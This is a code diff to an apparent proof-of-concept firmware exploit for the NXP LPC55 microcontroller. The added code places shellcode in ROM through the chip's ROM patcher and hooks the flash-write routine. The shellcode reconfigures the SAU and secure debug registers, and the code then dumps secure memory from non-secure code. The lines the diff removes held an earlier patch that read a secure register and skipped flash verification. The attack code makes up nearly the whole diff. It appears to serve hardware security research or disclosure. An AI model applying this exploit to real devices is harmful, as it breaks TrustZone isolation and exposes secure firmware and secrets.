@@ -124,6 +124,31 @@ static const osThreadAttr_t lpc55_poc_thread_attr = {
 
 #define INS_INDEX(a) (7-(a))
 
+const uint8_t shellcode[] = {
+    0x04, 0x4e, // 0:	4e04      	ldr	r6, [pc, #16]	; (14 <secure_constant_pool>)
+    0x1c, 0xce, // 2:	ce1c      	ldmia	r6!, {r2, r3, r4}
+    0x18, 0xc2, // 4:	c218      	stmia	r2!, {r3, r4}
+    0x1c, 0xce, // 6:	ce1c      	ldmia	r6!, {r2, r3, r4}
+    0x18, 0xc2, // 8:	c218      	stmia	r2!, {r3, r4}
+    0x1c, 0xce, // a:	ce1c      	ldmia	r6!, {r2, r3, r4}
+    0x18, 0xc2, // c:	c218      	stmia	r2!, {r3, r4}
+    0x82, 0x46, // e:	4682      	mov	sl, r0
+    0x0e, 0x1c, // 10:	1c0e      	adds	r6, r1, #0
+    0x70, 0x47, // 12:	4770      	bx	lr
+};
+
+const uint32_t constant_pool[] = {
+    0xE000EDD8,  // SAU_RNR
+    0x00000001,  // SAU Region
+    0x20000000,  // SAU Region Base Address
+    0xE000EDD8,  // SAU_RNR
+    0x00000000,  // SAU Region
+    0x00000000,  // SAU Region Base Address
+    0x500ACFF8,  // Secure AHB MISC_CTRL_DP_REG
+    0x00002222,  // Value for MISC_CTRL_DP_REG
+    0x00002222,  // Value for MISC_CTRL_REG
+};
+
 __attribute__((noreturn))
 void lpc55_poc(void *argument) {
     UNUSED_VARIABLE(argument);
@@ -133,7 +158,6 @@ void lpc55_poc(void *argument) {
 
     LOG_MSG("[LPC55 PoC] Starting rom patch\r\n");
 
-    osDelay(osKernelGetTickFreq() * 5);
     volatile uint32_t *ctrl_addr = (volatile uint32_t *)0x4003e0f4;
     volatile uint32_t *addr_reg = (volatile uint32_t *)0x4003e100;
     volatile uint32_t *insn_reg = (volatile uint32_t *)0x4003e0d4;
@@ -141,58 +165,38 @@ void lpc55_poc(void *argument) {
 	// Turn off patcher
 	*ctrl_addr = 0x20000000;
 
-	// second instruction of flash_program after the push
-	// b 0x1300718c
-	addr_reg[0] = 0x1300730c;
-	insn_reg[INS_INDEX(0)] = 0x4698e73e;
+    // Copy shell code to 0x1300718c
+    const uint32_t* shellcode_words = (const uint32_t *)shellcode;
+    size_t ii;
+    for(ii = 0; ii < sizeof(shellcode)/sizeof(uint32_t); ++ii) {
+        addr_reg[ii] = 0x1300718c + ii*4;
+        insn_reg[INS_INDEX(ii)] = shellcode_words[ii];
+    }
 
-	// Our target region. We use r4 here because it already
-	// was saved on the stack and it gets overwritten by
-	// a mov very shortly afterwards.
+    // Append address of constant pool in non-secure memory
+    addr_reg[ii] = 0x1300718c + ii*4;
+    insn_reg[INS_INDEX(ii)] = (uint32_t)&constant_pool;
+    ++ii;
 
-	// movw    r4, #60672      ; 0xed00
-	addr_reg[1] =  0x1300718c;
-	insn_reg[INS_INDEX(1)] = 0x5400f64e;
-
-	// movt    r4, #57344      ; 0xe000
-	addr_reg[2] = 0x13007190;
-	insn_reg[INS_INDEX(2)] = 0x0400f2ce;
-
-	// R4 now has the address of the secure alias of CPUID
-	// Reading this from non-secure mode returns 0, if it
-	// returns non-zero it means we read this from secure
-	// mode.
-	//
-	// ldr.w   r4, [r4]
-	// mov     fp, r2
-	addr_reg[3] = 0x13007194;
-	insn_reg[INS_INDEX(3)] = 0x46936824;
-
-	// str.w   r4, [fp, #372]
-	//
-	// This is where we store our counter in the buffer
-	// It's hard coded for now
-	addr_reg[4] = 0x13007198;
-	insn_reg[INS_INDEX(4)] = 0x4174f8cb;
-
-	// b 0x1300730e
-	// Back to the flash write function
-	addr_reg[5] = 0x1300719c;
-	insn_reg[INS_INDEX(5)] = 0xbf00e0b7;
-
-	// Extra for now
-	addr_reg[6] = 0x130071a0;
-	insn_reg[INS_INDEX(6)] = 0xffffffff;
-
-	// Just return from the flash_verify call
-	// (who really cares about that anyway)
-	addr_reg[7] = 0x130073f8;
-	insn_reg[INS_INDEX(7)] = 0x47702000;
+    // Patch Flash_Write to jump to our shell code
+    addr_reg[ii] = 0x13007310;
+    insn_reg[INS_INDEX(ii)] = 0xff3cf7ff;  // f7ff ff3c  // bl PC-0x188
 
 	// Turn it back on
 	*ctrl_addr = 0xffff;
 
     LOG_MSG("[LPC55 PoC] Finished ROM patch\r\n");
+
+    LOG_MSG("[LPC55 PoC] Start of Secure Code:r\n");
+    const uint8_t *secure_code = (const uint8_t *)0x0;
+
+    for (ii = 0; ii < 256; ii += 16) {
+        LOG_MSG("[LPC55 PoC] 0x%x:\t", ii);
+        for (size_t jj = 0; jj < 16; ++jj) {
+            LOG_MSG("%x\t", *(secure_code + jj + ii));
+        }
+        LOG_MSG("\r\n");
+    }
 
     osDelay(osKernelGetTickFreq() * 10);
     while (1) {
